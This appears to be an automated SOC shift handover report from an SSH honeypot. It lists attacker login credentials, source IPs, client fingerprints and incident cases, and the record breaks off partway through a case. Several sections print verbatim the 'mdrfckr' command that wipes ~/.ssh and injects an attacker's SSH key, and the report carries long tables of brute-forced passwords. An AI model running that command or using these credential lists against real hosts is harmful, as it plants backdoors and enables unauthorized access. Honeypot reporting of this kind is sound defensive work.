# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-02 |
| **Generated At** | 2026-07-02T07:37:28Z |
| **Shift Time** | 07:37 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **287** |
| Confirmed Threats | **277** |
| False Positives Filtered | **10** (3.5%) |
| Unique Attacker IPs | **82** |
| Countries of Origin | **24** |
| High Severity Cases | **195** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **92** |
| Malware Samples Analyzed | **4** HIGH · **37** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **237** |
| Unique Credential Pairs | **155** |
| Unique Usernames | **32** |
| Unique Passwords | **136** |
| Successful Auth Pairs | **211** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 141 |
| `345gs5662d34` | 41 |
| `ubuntu` | 9 |
| `oracle` | 3 |
| `lghkel	` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 41 |
| `3245gs5662d34` | 38 |
| `123456` | 5 |
| `smo@@kkklss` | 4 |
| `﻿------fuck------` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 41 |
| `root` | `3245gs5662d34` | 25 |
| `root` | `smo@@kkklss` | 4 |
| `root` | `﻿------fuck------` | 3 |
| `root` | `123@@@` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Abcd#1234` | `14.103.114.218` | 2026-07-02T02:55:44 |
| `345gs5662d34` | `345gs5662d34` | `14.103.114.218` | 2026-07-02T02:55:49 |
| `root` | `As123456@` | `209.145.57.206` | 2026-07-02T02:57:32 |
| `345gs5662d34` | `345gs5662d34` | `209.145.57.206` | 2026-07-02T02:57:33 |
| `root` | `3245gs5662d34` | `209.145.57.206` | 2026-07-02T02:57:34 |
| `ubuntu` | `qq123456` | `209.38.121.186` | 2026-07-02T02:58:35 |
| `345gs5662d34` | `345gs5662d34` | `209.38.121.186` | 2026-07-02T02:58:39 |
| `ubuntu` | `3245gs5662d34` | `209.38.121.186` | 2026-07-02T02:58:40 |
| `root` | `﻿------fuck------` | `10.0.0.73` | 2026-07-02T03:03:24 |
| `tomcat` | `tomcat123` | `45.198.224.120` | 2026-07-02T03:04:55 |
| `root` | `qweQWE123!@#` | `45.205.1.42` | 2026-07-02T03:07:54 |
| `admin` | `admin` | `34.79.21.94` | 2026-07-02T03:12:13 |
| `root` | `Passwd@12345` | `185.242.3.195` | 2026-07-02T03:16:25 |
| `root` | `!root` | `195.178.110.227` | 2026-07-02T03:16:34 |
| `root` | `P@ssw0rd456` | `45.198.224.120` | 2026-07-02T03:17:28 |
| `root` | `111111` | `195.178.110.227` | 2026-07-02T03:19:16 |
| `root` | `Passwd@12345` | `10.0.0.73` | 2026-07-02T03:20:13 |
| `root` | `!@#$1234` | `45.205.1.42` | 2026-07-02T03:21:53 |
| `root` | `123123` | `195.178.110.227` | 2026-07-02T03:21:54 |
| `root` | `123321` | `195.178.110.227` | 2026-07-02T03:24:28 |
| `root` | `1234` | `195.178.110.227` | 2026-07-02T03:27:03 |
| `beasiswa` | `beasiswa123` | `150.5.131.119` | 2026-07-02T03:28:13 |
| `345gs5662d34` | `345gs5662d34` | `150.5.131.119` | 2026-07-02T03:28:17 |
| `beasiswa` | `3245gs5662d34` | `150.5.131.119` | 2026-07-02T03:28:19 |
| `root` | `12345` | `195.178.110.227` | 2026-07-02T03:29:28 |
| `root` | `ROOT123` | `45.198.224.120` | 2026-07-02T03:29:57 |
| `root` | `---fuck_you----` | `43.103.51.190` | 2026-07-02T03:30:57 |
| `projeto` | `123456` | `117.20.119.70` | 2026-07-02T03:32:22 |
| `345gs5662d34` | `345gs5662d34` | `117.20.119.70` | 2026-07-02T03:32:27 |
| `projeto` | `3245gs5662d34` | `117.20.119.70` | 2026-07-02T03:32:29 |
| `root` | `1234567` | `195.178.110.227` | 2026-07-02T03:34:24 |
| `root` | `123qwert` | `45.205.1.42` | 2026-07-02T03:35:53 |
| `root` | `12345678` | `195.178.110.227` | 2026-07-02T03:36:59 |
| `root` | `123456789` | `195.178.110.227` | 2026-07-02T03:39:40 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-02T03:40:39 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-02T03:40:40 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-02T03:40:40 |
| `web1` | `password` | `45.198.224.120` | 2026-07-02T03:42:34 |
| `root` | `1234567890` | `195.178.110.227` | 2026-07-02T03:42:36 |
| `root` | `123456a` | `195.178.110.227` | 2026-07-02T03:46:05 |
| `root` | `qweasd123!@#` | `185.228.135.197` | 2026-07-02T03:46:20 |
| `oracle` | `oracle@321` | `216.155.93.75` | 2026-07-02T03:46:21 |
| `345gs5662d34` | `345gs5662d34` | `185.228.135.197` | 2026-07-02T03:46:23 |
| `root` | `3245gs5662d34` | `185.228.135.197` | 2026-07-02T03:46:25 |
| `345gs5662d34` | `345gs5662d34` | `216.155.93.75` | 2026-07-02T03:46:25 |
| `oracle` | `3245gs5662d34` | `216.155.93.75` | 2026-07-02T03:46:26 |
| `root` | `cloud@2026` | `101.47.159.50` | 2026-07-02T03:47:52 |
| `345gs5662d34` | `345gs5662d34` | `101.47.159.50` | 2026-07-02T03:47:56 |
| `root` | `3245gs5662d34` | `101.47.159.50` | 2026-07-02T03:47:59 |
| `root` | `Qazxsw21` | `45.205.1.42` | 2026-07-02T03:49:36 |
| `root` | `123456b` | `195.178.110.227` | 2026-07-02T03:49:59 |
| `root` | `P@$$word` | `47.242.11.232` | 2026-07-02T03:52:11 |
| `345gs5662d34` | `345gs5662d34` | `47.242.11.232` | 2026-07-02T03:52:15 |
| `root` | `3245gs5662d34` | `47.242.11.232` | 2026-07-02T03:52:17 |
| `root` | `﻿------fuck------` | `124.225.4.88` | 2026-07-02T03:53:01 |
| `root` | `1234abcd` | `195.178.110.227` | 2026-07-02T03:54:23 |
| `huangsiyan` | `huangsiyan` | `45.198.224.120` | 2026-07-02T03:54:59 |
| `root` | `123abc` | `195.178.110.227` | 2026-07-02T03:59:32 |
| `root` | `p0o9i8u7y6` | `14.103.127.232` | 2026-07-02T04:01:18 |
| `345gs5662d34` | `345gs5662d34` | `14.103.127.232` | 2026-07-02T04:01:22 |
| `root` | `3245gs5662d34` | `14.103.127.232` | 2026-07-02T04:01:23 |
| `root` | `privatessh` | `45.205.1.42` | 2026-07-02T04:03:26 |
| `root` | `123qwe` | `195.178.110.227` | 2026-07-02T04:05:06 |
| `oracle` | `123` | `45.198.224.120` | 2026-07-02T04:06:38 |
| `root` | `iddqd` | `8.146.225.57` | 2026-07-02T04:10:13 |
| `345gs5662d34` | `345gs5662d34` | `8.146.225.57` | 2026-07-02T04:10:17 |
| `root` | `3245gs5662d34` | `8.146.225.57` | 2026-07-02T04:10:19 |
| `root` | `1q2w3e4r` | `195.178.110.227` | 2026-07-02T04:10:31 |
| `root` | `ABC@123456` | `10.0.0.73` | 2026-07-02T04:10:49 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-07-02T04:10:53 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-07-02T04:10:55 |
| `root` | `qazwsx!@#` | `185.242.3.195` | 2026-07-02T04:11:22 |
| `ansible` | `pass` | `192.169.213.186` | 2026-07-02T04:15:32 |
| `345gs5662d34` | `345gs5662d34` | `192.169.213.186` | 2026-07-02T04:15:35 |
| `ansible` | `3245gs5662d34` | `192.169.213.186` | 2026-07-02T04:15:35 |
| `root` | `1qaz2wsx` | `195.178.110.227` | 2026-07-02T04:15:44 |
| `root` | `Root123!@#` | `45.205.1.42` | 2026-07-02T04:17:17 |
| `root` | `Qaz!@#123` | `10.0.0.73` | 2026-07-02T04:17:47 |
| `user1` | `user1` | `45.198.224.120` | 2026-07-02T04:18:29 |
| `root` | `Pa$$W0rd` | `197.199.224.52` | 2026-07-02T04:20:07 |
| `345gs5662d34` | `345gs5662d34` | `197.199.224.52` | 2026-07-02T04:20:10 |
| `root` | `3245gs5662d34` | `197.199.224.52` | 2026-07-02T04:20:11 |
| `root` | `1qaz@WSX` | `195.178.110.227` | 2026-07-02T04:20:58 |
| `root` | `hwb890821` | `10.0.0.73` | 2026-07-02T04:21:20 |
| `root` | `pg.123456` | `103.97.101.25` | 2026-07-02T04:22:35 |
| `345gs5662d34` | `345gs5662d34` | `103.97.101.25` | 2026-07-02T04:22:39 |
| `root` | `3245gs5662d34` | `103.97.101.25` | 2026-07-02T04:22:41 |
| `root` | `qwer@12345` | `38.252.213.122` | 2026-07-02T04:25:47 |
| `345gs5662d34` | `345gs5662d34` | `38.252.213.122` | 2026-07-02T04:25:49 |
| `root` | `3245gs5662d34` | `38.252.213.122` | 2026-07-02T04:25:50 |
| `root` | `21` | `195.178.110.227` | 2026-07-02T04:26:13 |
| `root` | `aaaaaaaaaa` | `34.124.225.147` | 2026-07-02T04:29:36 |
| `345gs5662d34` | `345gs5662d34` | `34.124.225.147` | 2026-07-02T04:29:40 |
| `root` | `3245gs5662d34` | `34.124.225.147` | 2026-07-02T04:29:42 |
| `root` | `root01` | `45.198.224.120` | 2026-07-02T04:30:33 |
| `root` | `Qwe123asd` | `45.205.1.42` | 2026-07-02T04:31:03 |
| `root` | `321` | `195.178.110.227` | 2026-07-02T04:31:34 |
| `root` | `zlxx` | `112.168.171.175` | 2026-07-02T04:32:18 |
| `root` | `linux@2024` | `2.229.200.226` | 2026-07-02T04:32:45 |
| `345gs5662d34` | `345gs5662d34` | `2.229.200.226` | 2026-07-02T04:32:47 |
| `root` | `3245gs5662d34` | `2.229.200.226` | 2026-07-02T04:32:49 |
| `root` | `cat1029` | `112.168.171.175` | 2026-07-02T04:32:52 |
| `b'\xcc\xd1\xd1\xca'` | `b'\xe4\xca\xdb\x8b\x8c\x8f'` | `112.168.171.175` | 2026-07-02T04:33:26 |
| `lghkel	` | `zpz}ld	` | `112.168.171.175` | 2026-07-02T04:33:27 |
| `b'\xcc\xd1\xd1\xca'` | `b'\xc6\xdd\x8d\x8b\x8f\x8f'` | `112.168.171.175` | 2026-07-02T04:34:01 |
| `user` | `user` | `112.168.171.175` | 2026-07-02T04:34:35 |
| `"??$` | `185$*9 h` | `112.168.171.175` | 2026-07-02T04:35:09 |
| `root` | `asd1230.` | `180.76.146.178` | 2026-07-02T04:35:30 |
| `345gs5662d34` | `345gs5662d34` | `180.76.146.178` | 2026-07-02T04:35:35 |
| `root` | `3245gs5662d34` | `180.76.146.178` | 2026-07-02T04:35:38 |
| `youraccount` | `youraccount123` | `150.136.214.177` | 2026-07-02T04:35:41 |
| `345gs5662d34` | `345gs5662d34` | `150.136.214.177` | 2026-07-02T04:35:42 |
| `youraccount` | `3245gs5662d34` | `150.136.214.177` | 2026-07-02T04:35:42 |
| `b'\xdf\xda\xd3\xd7\xd0'` | `b'\xce\xdf\xcd\xcd'` | `112.168.171.175` | 2026-07-02T04:35:43 |
| `guest` | `guest` | `112.168.171.175` | 2026-07-02T04:36:18 |
| `puppet` | `puppet` | `10.0.0.73` | 2026-07-02T04:36:42 |
| `puppet` | `3245gs5662d34` | `10.0.0.73` | 2026-07-02T04:36:48 |
| `admin` | `epicrouter` | `112.168.171.175` | 2026-07-02T04:36:52 |
| `root` | `4321` | `195.178.110.227` | 2026-07-02T04:36:56 |
| `default` | `S2fGqNFs` | `112.168.171.175` | 2026-07-02T04:37:26 |
| `tau` | `tau123` | `101.126.53.14` | 2026-07-02T04:42:04 |
| `345gs5662d34` | `345gs5662d34` | `101.126.53.14` | 2026-07-02T04:42:09 |
| `root` | `54321` | `195.178.110.227` | 2026-07-02T04:42:13 |
| `root` | `12qwsazx` | `45.198.224.120` | 2026-07-02T04:42:28 |
| `root` | `qaz74123` | `45.205.1.42` | 2026-07-02T04:44:45 |
| `root` | `555555` | `195.178.110.227` | 2026-07-02T04:47:16 |
| `root` | `qazwsx!@#` | `10.0.0.73` | 2026-07-02T04:51:42 |
| `root` | `654321` | `195.178.110.227` | 2026-07-02T04:52:09 |
| `edm` | `edm` | `10.0.0.73` | 2026-07-02T04:54:10 |
| `edm` | `3245gs5662d34` | `10.0.0.73` | 2026-07-02T04:54:13 |
| `ubuntu` | `Aa123456` | `45.198.224.120` | 2026-07-02T04:54:18 |
| `root` | `202620` | `171.25.158.87` | 2026-07-02T04:56:36 |
| `345gs5662d34` | `345gs5662d34` | `171.25.158.87` | 2026-07-02T04:56:38 |
| `root` | `3245gs5662d34` | `171.25.158.87` | 2026-07-02T04:56:39 |
| `root` | `7777777` | `195.178.110.227` | 2026-07-02T04:57:09 |
| `root` | `joseph` | `45.205.1.42` | 2026-07-02T04:58:34 |
| `eservice` | `eservice` | `49.207.40.162` | 2026-07-02T05:01:07 |
| `345gs5662d34` | `345gs5662d34` | `122.176.20.134` | 2026-07-02T05:01:11 |
| `eservice` | `3245gs5662d34` | `106.219.156.130` | 2026-07-02T05:01:14 |
| `root` | `Admin2026!` | `195.178.110.227` | 2026-07-02T05:02:31 |
| `fi` | `123456` | `10.0.0.73` | 2026-07-02T05:02:45 |
| `fi` | `3245gs5662d34` | `10.0.0.73` | 2026-07-02T05:02:50 |
| `root` | `P@$$w0rd2025` | `117.34.85.169` | 2026-07-02T05:05:03 |
| `root` | `123qwe456` | `62.132.18.53` | 2026-07-02T05:05:16 |
| `345gs5662d34` | `345gs5662d34` | `62.132.18.53` | 2026-07-02T05:05:18 |
| `root` | `3245gs5662d34` | `62.132.18.53` | 2026-07-02T05:05:18 |
| `root` | `qaz!@#` | `45.198.224.120` | 2026-07-02T05:06:05 |
| `root` | `P4ssw0rd` | `195.178.110.227` | 2026-07-02T05:07:35 |
| `root` | `P@SSWORD1234` | `45.205.1.42` | 2026-07-02T05:12:06 |
| `root` | `P4ssword` | `195.178.110.227` | 2026-07-02T05:12:08 |
| `root` | `P@ssw0rd` | `195.178.110.227` | 2026-07-02T05:16:28 |
| `root` | `qq123.com` | `45.198.224.120` | 2026-07-02T05:18:19 |
| `root` | `P@ssw0rd2026` | `195.178.110.227` | 2026-07-02T05:20:57 |
| `root` | `P@ssword` | `195.178.110.227` | 2026-07-02T05:25:26 |
| `jira1` | `jira1` | `45.205.1.42` | 2026-07-02T05:25:45 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `162.216.150.52` | 2026-07-02T05:26:11 |
| `root` | `Passw0rd` | `195.178.110.227` | 2026-07-02T05:30:09 |
| `root` | `Oracle!@#123` | `45.198.224.120` | 2026-07-02T05:30:52 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-02T05:33:44 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-02T05:33:46 |
| `root` | `Password1` | `195.178.110.227` | 2026-07-02T05:35:01 |
| `ubuntu` | `oracle1234` | `45.205.1.42` | 2026-07-02T05:39:35 |
| `root` | `Root123` | `195.178.110.227` | 2026-07-02T05:40:18 |
| `root` | `qwe12345^&*` | `185.242.3.195` | 2026-07-02T05:43:01 |
| `root` | `abc123` | `45.198.224.120` | 2026-07-02T05:43:05 |
| `root` | `abc123` | `195.178.110.227` | 2026-07-02T05:45:49 |
| `root` | `new1234!` | `165.154.36.71` | 2026-07-02T05:47:42 |
| `345gs5662d34` | `345gs5662d34` | `165.154.36.71` | 2026-07-02T05:47:45 |
| `root` | `3245gs5662d34` | `165.154.36.71` | 2026-07-02T05:47:45 |
| `ubuntu` | `6` | `10.0.0.73` | 2026-07-02T05:48:45 |
| `ubuntu` | `3245gs5662d34` | `10.0.0.73` | 2026-07-02T05:48:50 |
| `root` | `admin` | `195.178.110.227` | 2026-07-02T05:51:23 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `65.49.1.108` | 2026-07-02T05:51:28 |
| `root` | `linux@123456` | `223.17.1.118` | 2026-07-02T05:51:55 |
| `345gs5662d34` | `345gs5662d34` | `223.17.1.118` | 2026-07-02T05:51:59 |
| `root` | `3245gs5662d34` | `223.17.1.118` | 2026-07-02T05:52:00 |
| `root` | `Passw0rd2026` | `10.0.0.73` | 2026-07-02T05:52:40 |
| `samp` | `123456` | `45.205.1.42` | 2026-07-02T05:53:39 |
| `root` | `password@1234` | `180.75.116.159` | 2026-07-02T05:54:36 |
| `345gs5662d34` | `345gs5662d34` | `180.75.116.159` | 2026-07-02T05:54:41 |
| `root` | `3245gs5662d34` | `180.75.116.159` | 2026-07-02T05:54:43 |
| `ubuntu` | `passw0rd` | `45.198.224.120` | 2026-07-02T05:55:00 |
| `root` | `alpine` | `195.178.110.227` | 2026-07-02T05:57:13 |
| `root` | `bismillah12` | `177.155.133.175` | 2026-07-02T06:00:11 |
| `345gs5662d34` | `345gs5662d34` | `177.155.133.175` | 2026-07-02T06:00:14 |
| `root` | `3245gs5662d34` | `177.155.133.175` | 2026-07-02T06:00:15 |
| `root` | `changeme` | `195.178.110.227` | 2026-07-02T06:03:24 |
| `test10` | `test10` | `45.198.224.120` | 2026-07-02T06:06:42 |
| `root` | `PaSSworD0` | `45.205.1.42` | 2026-07-02T06:07:24 |
| `root` | `default` | `195.178.110.227` | 2026-07-02T06:11:57 |
| `root` | `letmein` | `195.178.110.227` | 2026-07-02T06:17:32 |
| `nagios` | `1234` | `45.198.224.120` | 2026-07-02T06:18:09 |
| `ubuntu` | `changeme` | `45.205.1.42` | 2026-07-02T06:21:19 |
| `root` | `Hc123456` | `10.0.0.73` | 2026-07-02T06:22:48 |
| `root` | `qwe12345^&*` | `10.0.0.73` | 2026-07-02T06:24:07 |
| `root` | `Oracle2015` | `45.198.224.120` | 2026-07-02T06:29:47 |
| `eventos` | `eventos123` | `189.190.244.176` | 2026-07-02T06:31:30 |
| `345gs5662d34` | `345gs5662d34` | `189.190.244.176` | 2026-07-02T06:31:33 |
| `eventos` | `3245gs5662d34` | `189.190.244.176` | 2026-07-02T06:31:33 |
| `root` | `Super198311` | `129.121.85.48` | 2026-07-02T06:33:06 |
| `345gs5662d34` | `345gs5662d34` | `129.121.85.48` | 2026-07-02T06:33:07 |
| `root` | `3245gs5662d34` | `129.121.85.48` | 2026-07-02T06:33:07 |
| `root` | `Qwe123!@#` | `45.205.1.42` | 2026-07-02T06:34:50 |
| `root` | `Fk123456@` | `106.13.122.214` | 2026-07-02T06:41:11 |
| `345gs5662d34` | `345gs5662d34` | `106.13.122.214` | 2026-07-02T06:41:16 |
| `root` | `Pactera@2019` | `45.198.224.120` | 2026-07-02T06:41:24 |
| `root` | `qwe1` | `10.0.0.73` | 2026-07-02T06:44:22 |
| `testssh` | `123456` | `10.0.0.73` | 2026-07-02T06:48:06 |
| `testssh` | `3245gs5662d34` | `10.0.0.73` | 2026-07-02T06:48:11 |
| `root` | `P455word` | `45.205.1.42` | 2026-07-02T06:48:37 |
| `ubuntu` | `1z2x3c` | `45.198.224.120` | 2026-07-02T06:53:02 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **287** |
| Sessions with Fingerprint | **19** |
| Unique HASSH Fingerprints | **19** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 99 |
| Go SSH scanner | 94 |
| Paramiko (Python) | 10 |
| Unknown | 3 |
| OpenSSH | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 91 | 37 |
| `16443846184e...` | Generic scanner | 42 | 3 |
| `2ec37a7cc8da...` | Mirai/variant | 41 | 1 |
| `a2de0f306611...` | Mirai/variant | 10 | 2 |
| `98f63c4d9c87...` | Generic scanner | 3 | 3 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 91 | 37 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 42 | 3 | Generic scanner |
| `2ec37a7cc8da...` | Go SSH scanner | 41 | 1 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 10 | 2 | Mirai/variant |
| `98f63c4d9c87...` | Go SSH scanner | 3 | 3 | Generic scanner |
| `af8223ac9914...` | libssh | 3 | 1 | libssh-based |
| `671ac49b8bd6...` | libssh | 3 | 1 | Mirai/variant |
| `95420f9d932d...` | Go SSH scanner | 3 | 2 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **9** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 30 | 30 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `129.121.85.48`, `14.103.127.232`, `101.126.53.14`, `47.242.11.232`, `165.154.36.71`, `62.132.18.53`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **82** |
| Unique ASNs | **49** |
| High-Risk ASNs | **45** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 8 | HIGH |
| `AS25369` | Hydra Communications Ltd | 6 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 4 | HIGH |
| `AS31898` | Oracle Corporation | 4 | HIGH |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 4 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 3 | HIGH |
| `AS398324` | Censys, Inc. | 3 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (193)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-825b49d9d4a8

| Field | Detail |
|---|---|
| **Source IP** | `14.103.114[.]218` |
| **First Seen** | 2026-07-02 02:55 |
| **Last Seen** | 2026-07-02 02:56 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 02:55:42` | `cowrie.session.connect` |
| `2026-07-02 02:55:42` | `cowrie.client.version` |
| `2026-07-02 02:55:43` | `cowrie.client.kex` |
| `2026-07-02 02:55:44` | `cowrie.login.success` |
| `2026-07-02 02:55:45` | `cowrie.session.params` |
| `2026-07-02 02:55:45` | `cowrie.command.input` |
| `2026-07-02 02:55:45` | `cowrie.command.failed` |
| `2026-07-02 02:55:46` | `cowrie.log.closed` |
| `2026-07-02 02:55:47` | `cowrie.session.params` |
| `2026-07-02 02:55:47` | `cowrie.command.input` |
| `2026-07-02 02:55:47` | `cowrie.session.file_download` |
| `2026-07-02 02:55:47` | `cowrie.log.closed` |
| `2026-07-02 02:56:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.114[.]218` to AbuseIPDB if not already reported
- [ ] Block `14.103.114[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-205a8d69bd0e

| Field | Detail |
|---|---|
| **Source IP** | `14.103.114[.]218` |
| **First Seen** | 2026-07-02 02:55 |
| **Last Seen** | 2026-07-02 02:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 02:55:47` | `cowrie.session.connect` |
| `2026-07-02 02:55:47` | `cowrie.client.version` |
| `2026-07-02 02:55:48` | `cowrie.client.kex` |
| `2026-07-02 02:55:49` | `cowrie.login.success` |
| `2026-07-02 02:55:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.114[.]218` to AbuseIPDB if not already reported
- [ ] Block `14.103.114[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26f7e210322f

| Field | Detail |
|---|---|
| **Source IP** | `209.145.57[.]206` |
| **First Seen** | 2026-07-02 02:57 |
| **Last Seen** | 2026-07-02 02:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 02:57:32` | `cowrie.session.connect` |
| `2026-07-02 02:57:32` | `cowrie.client.version` |
| `2026-07-02 02:57:32` | `cowrie.client.kex` |
| `2026-07-02 02:57:32` | `cowrie.login.success` |
| `2026-07-02 02:57:32` | `cowrie.session.params` |
| `2026-07-02 02:57:32` | `cowrie.command.input` |
| `2026-07-02 02:57:32` | `cowrie.command.failed` |
| `2026-07-02 02:57:32` | `cowrie.log.closed` |
| `2026-07-02 02:57:33` | `cowrie.session.params` |
| `2026-07-02 02:57:33` | `cowrie.command.input` |
| `2026-07-02 02:57:33` | `cowrie.session.file_download` |
| `2026-07-02 02:57:33` | `cowrie.log.closed` |
| `2026-07-02 02:57:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.145.57[.]206` to AbuseIPDB if not already reported
- [ ] Block `209.145.57[.]206` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d65a01f4933

| Field | Detail |
|---|---|
| **Source IP** | `209.145.57[.]206` |
| **First Seen** | 2026-07-02 02:57 |
| **Last Seen** | 2026-07-02 02:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 02:57:33` | `cowrie.session.connect` |
